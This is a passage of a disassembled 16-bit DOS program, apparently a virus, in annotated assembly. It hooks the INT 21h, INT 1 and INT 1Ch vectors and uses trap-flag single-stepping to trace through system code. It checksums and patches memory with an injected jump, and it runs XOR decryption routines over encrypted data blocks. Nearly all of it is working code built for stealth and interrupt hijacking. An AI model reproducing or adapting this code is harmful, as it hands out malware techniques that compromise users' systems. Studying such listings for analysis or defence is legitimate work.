		db	0B8h, 21h, 35h, 0CDh, 21h, 8Ch
		db	6, 2Ch, 0, 89h, 1Eh, 2Ah
		db	0, 8Ch, 6, 30h, 0, 89h
		db	1Eh, 2Eh, 0, 0B8h, 1, 35h
		db	0CDh, 21h, 8Bh, 0F3h, 8Ch, 0C7h
		db	0B8h, 1Ch, 35h, 0CDh, 21h, 8Ch
		db	6, 38h, 0, 89h, 1Eh, 36h
		db	0, 5Bh, 0B8h, 21h, 25h, 0BAh
		db	96h, 3, 0CDh, 21h, 0B8h, 1
		db	25h, 0BAh, 0F1h, 8, 0CDh, 21h
		db	0BAh, 22h, 2, 9Ch, 8Bh, 0C3h
		db	5, 26h, 9, 0Eh, 50h, 0FAh
		db	9Ch, 58h, 0Dh, 0, 1, 50h
		db	8Bh, 0C3h, 5, 0B8h, 2, 0Eh
		db	50h, 0B8h, 1Ch, 25h, 0C6h, 6
		db	42h, 0, 1, 0CFh, 55h, 8Bh
		db	0ECh, 2Eh, 80h, 3Eh, 42h, 0
		db	1
		db	74h, 0Dh
loc_55:
		and	word ptr [bp+6],0FEFFh
		mov	byte ptr cs:data_36e,0
		pop	bp
		iret					; Interrupt return
sub_12		endp

		cmp	word ptr [bp+4],300h
		jb	loc_56				; Jump if below
		pop	bp
		iret					; Interrupt return
loc_56:
		push	bx
		mov	bx,[bp+2]
		mov	cs:data_27e,bx
		mov	bx,[bp+4]
		mov	cs:data_28e,bx
		pop	bx
		jmp	short loc_55
		mov	byte ptr ds:data_36e,0
		mov	ax,2501h
		mov	dx,si
		mov	ds,di
		int	21h				; DOS Services  ah=function 25h
							;  set intrpt vector al to ds:dx
		xor	ax,ax				; Zero register
		mov	ds,ax
		mov	word ptr ds:data_1e,397Fh
		mov	byte ptr ds:data_2e,29h		; ')'
		mov	ax,ds:data_3e
		mov	cl,6
		shl	ax,cl				; Shift w/zeros fill
		mov	ds,ax
		mov	si,12Eh
		xor	ax,ax				; Zero register
		mov	cx,61h

locloop_57:
		add	ax,[si]
		add	si,2
		loop	locloop_57			; Loop if cx > 0

		cmp	ax,53Bh
		je	loc_58				; Jump if equal
		jmp	loc_54
loc_58:
		cli					; Disable interrupts
		mov	byte ptr ds:data_69e,1
		mov	byte ptr ds:data_70e,1
		mov	byte ptr ds:data_67e,0E9h
		mov	word ptr ds:data_68e,341h
		push	ds
		pop	es
		push	cs
		pop	ds
		mov	si,bx
		add	si,117h
		mov	di,3D7h
		mov	cx,27h
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		sti					; Enable interrupts
		jmp	loc_54

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_13		proc	near
		push	bp
		mov	bp,sp
		push	cx
		mov	ax,8000h
		xor	cx,cx				; Zero register
loc_59:
		test	ax,[bp+8]
		jnz	loc_60				; Jump if not zero
		inc	cx
		shr	ax,1				; Shift w/zeros fill
		jmp	short loc_59
loc_60:
		xor	ax,[bp+8]
		jz	loc_61				; Jump if zero
		mov	ax,[bp+4]
		add	ax,[bp+8]
		add	ax,cx
		sub	ax,11h
		clc					; Clear carry flag
		pop	cx
		pop	bp
		ret
loc_61:
		mov	ax,0Fh
		sub	ax,cx
		add	ax,[bp+6]
		stc					; Set carry flag
		pop	cx
		pop	bp
		ret
sub_13		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		push	bp
		mov	bp,sp
		sub	sp,10h
		mov	dx,8000h
loc_62:
		test	dx,[bp+8]
		jnz	loc_63				; Jump if not zero
		shr	dx,1				; Shift w/zeros fill
		jmp	short loc_62
loc_63:
		push	es
		push	di
		push	ax
		push	ss
		pop	es
		lea	di,[bp-10h]			; Load effective addr
		mov	cx,8
		xor	ax,ax				; Zero register
		rep	stosw				; Rep while cx>0 Store ax to es:[di]
		pop	ax
		pop	di
		pop	es
		mov	cx,[bp+8]
loc_64:
		test	cx,dx
		jnz	loc_65				; Jump if not zero
		jmp	loc_67
loc_65:
		push	cx
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_13
		mov	es,ax
		lahf					; Load ah from flags
		add	sp,6
		sahf					; Store ah into flags
		jc	loc_66				; Jump if carry Set
		mov	ax,es:data_59e
		xor	[bp-10h],ax
		mov	ax,es:data_60e
		xor	[bp-0Eh],ax
		mov	ax,es:data_61e
		xor	[bp-0Ch],ax
		mov	ax,es:data_62e
		xor	[bp-0Ah],ax
		mov	ax,es:data_63e
		xor	[bp-8],ax
		mov	ax,es:data_64e
		xor	[bp-6],ax
		mov	ax,es:data_65e
		xor	[bp-4],ax
		mov	ax,es:data_66e
		xor	[bp-2],ax
		jmp	short loc_67
		nop
loc_66:
		mov	ax,[bp-10h]
		mov	es:data_59e,ax
		mov	ax,[bp-0Eh]
		mov	es:data_60e,ax
		mov	ax,[bp-0Ch]
		mov	es:data_61e,ax
		mov	ax,[bp-0Ah]
		mov	es:data_62e,ax
		mov	ax,[bp-8]
		mov	es:data_63e,ax
		mov	ax,[bp-6]
		mov	es:data_64e,ax
		mov	ax,[bp-4]
		mov	es:data_65e,ax
		mov	ax,[bp-2]
		mov	es:data_66e,ax
		jmp	short loc_68
		nop
loc_67:
		dec	cx
		jmp	loc_64
loc_68:
		shr	dx,1				; Shift w/zeros fill
		jc	loc_69				; Jump if carry Set
		jmp	loc_63
loc_69:
		mov	sp,bp
		pop	bp
		ret
sub_14		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15		proc	near
		push	bp
		mov	bp,sp
		push	ds
loc_70:
		mov	ds,[bp+4]
		mov	es,[bp+6]
		xor	bx,bx				; Zero register
loc_71:
		mov	ax,es:[bx]
		xor	[bx],ax
		add	bx,2
		cmp	bx,10h
		jb	loc_71				; Jump if below
		inc	word ptr [bp+4]
		inc	word ptr [bp+6]
		dec	word ptr [bp+8]
		jnz	loc_70				; Jump if not zero
		pop	ds
		pop	bp
		ret
sub_15		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_16		proc	near
		push	bp
		mov	bp,sp
		push	ds
		mov	bl,1
loc_72:
		xor	si,si				; Zero register
loc_73:
		xor	cx,cx				; Zero register
		mov	di,[bp+8]
		add	di,[bp+0Ah]
		dec	di
loc_74:
		mov	ds,di
		shr	byte ptr [si],1			; Shift w/zeros fill
		rcl	cx,1				; Rotate thru carry
		dec	di
		cmp	di,[bp+8]
		jae	loc_74				; Jump if above or =
		or	cx,cx				; Zero ?
		jz	loc_75				; Jump if zero
		push	cx
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_13
		add	sp,6
		mov	ds,ax
		xor	[si],bl
loc_75:
		inc	si
		cmp	si,10h
		jb	loc_73				; Jump if below
		shl	bl,1				; Shift w/zeros fill
		jnc	loc_72				; Jump if carry=0
		pop	ds
		pop	bp
		ret
sub_16		endp

		xchg	bx,bx
		xor	ax,0F36Ah
		db	63h, 40h, 0D0h, 6Fh, 3Bh, 54h
		db	55h, 0DEh, 72h, 88h, 96h, 0DDh
		db	78h, 6Dh, 65h, 2Dh, 0Fh, 92h
		db	6Fh, 13h, 92h, 0E4h, 0A5h, 0C9h
		db	75h, 0FDh, 40h, 0A7h, 97h, 0D2h
		db	0CCh, 0Dh, 0B8h, 5, 4Ah, 0F2h
		db	0D3h, 0BCh, 0Ah, 39h, 0F6h, 78h
		db	20h, 55h, 18h, 0A0h, 0B6h, 59h
		db	0E9h, 63h, 6Dh, 0C2h, 14h, 0B5h
		db	0EBh, 1Bh, 8Ah, 1Dh, 0C3h
data_57		dw	3FF6h
		db	41h, 9Eh, 0BFh, 48h, 8Ah, 6
		db	0A7h, 0BAh, 0Ah, 89h, 93h, 55h
		db	78h, 31h, 90h, 8Fh, 0B0h, 0BAh
		db	0A4h, 67h, 0FDh, 0FBh, 36h, 9Dh
		db	0F8h, 25h, 85h, 98h, 28h, 0EEh
		db	0BBh, 8Eh, 0A4h, 27h, 6Eh, 3Dh
		db	35h, 0E3h, 0DCh, 9Eh, 47h, 2Dh
		db	3Ch, 7Ch, 5Ah, 0E5h, 0D4h, 7
		db	80h, 5Ch, 1, 40h, 1Fh, 4Ch
		db	0BCh, 0FCh, 3Dh, 0C3h, 0E8h, 6Dh
		db	0A1h, 4Ch, 45h, 54h, 0F4h, 7Ah
		db	29h, 0

code_seg_a	ends

		end	start

